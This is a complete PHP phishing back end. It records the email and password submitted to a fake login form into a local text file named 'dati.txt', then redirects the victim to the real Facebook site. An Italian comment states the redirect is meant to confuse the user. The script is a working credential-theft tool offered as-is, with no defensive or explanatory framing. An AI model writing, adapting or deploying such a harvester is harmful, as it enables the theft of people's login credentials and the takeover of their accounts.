
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $timestamp = date("Y-m-d H:i:s");
    
    $line = "[$timestamp] Email: $email | Password: $password\n";
    file_put_contents("dati.txt", $line, FILE_APPEND);

    // Reindirizza al vero Facebook per confondere l'utente
    header("Location: https://www.facebook.com");
    exit;
} else {
    echo "Accesso non autorizzato.";
}
?>
